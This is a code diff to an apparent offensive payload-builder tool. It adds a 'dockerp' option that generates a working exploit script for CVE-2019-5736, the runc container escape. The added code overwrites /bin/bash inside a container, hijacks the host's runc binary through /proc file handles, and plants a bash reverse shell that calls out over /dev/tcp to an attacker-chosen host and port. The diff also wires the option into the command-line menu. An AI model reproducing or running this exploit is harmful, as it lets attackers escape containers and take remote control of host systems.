@@ -365,6 +365,66 @@ def build_mof(lhost, lport):
     return mof_name
 
 
+def build_dockerp(lhost, lport):
+
+    payload = '''#!/usr/bin/env python2
+import os
+import stat
+host='%s'
+port='%s'
+''' % (lhost, lport)
+
+    payload += '''payload='#!/bin/bash\\necho "exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5"|/bin/bash\\n' % (host, port)
+target_file='/bin/bash'
+
+if __name__ == '__main__':
+
+  with open(target_file,'w') as evil:
+    evil.write('#!/proc/self/exe --criu')
+    os.chmod(target_file,stat.S_IXOTH)
+
+  found = 0
+  while found == 0:
+    procs = os.popen('ps -A -o pid')
+    for pid in procs:
+      pid = pid.strip()
+      if pid == 'PID': continue
+      if int(pid) > os.getpid():
+        try:
+          with open('/proc/%s/cmdline' % pid,'r') as cmdline:
+            if cmdline.read().find('runc') >= 0:
+              found = pid
+        except FileNotFoundError:
+          continue
+        except ProcessLookupError:
+          continue
+
+  handle = -1
+  while handle == -1:
+    try:
+      handle = os.open('/proc/%s/exe' % found, os.O_PATH)
+    except FileNotFoundError:
+      continue
+    except PermissionError:
+      continue
+  print('Got file handle')
+  write_handle = 0;
+  while write_handle == 0:
+    try:
+      write_handle = os.open('/proc/self/fd/%s' % str(handle),os.O_WRONLY|os.O_TRUNC)
+    except OSError:
+      continue
+  print('Got write handle')
+  result = os.write(write_handle,str.encode(payload))
+  if result == len(payload):
+    print('Successfully wrote payload')
+  else:
+    print('Could not write')
+    '''
+
+    with open('cve-2019-5736.py', 'w') as f:
+        f.write(payload)
+    print('[+] Saved: cve-2019-5736.py')
 
 
 def python_reverse_shell(lhost,lport, ver=''):
@@ -392,6 +452,7 @@ Simplifies payload creation and listener.
     lin32    <LHOST> <LPORT>  |   x32 Linux payload
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
     mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
+    dockerp  <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
@@ -575,6 +636,10 @@ if __name__ == '__main__':
 
     if type == 'mofnc':
         build_mof(lhost, lport)
+        sys.exit(0)
+
+    if type == 'dockerp':
+        build_dockerp(lhost, lport)
         sys.exit(0)
 
     if type[-1] == 's':
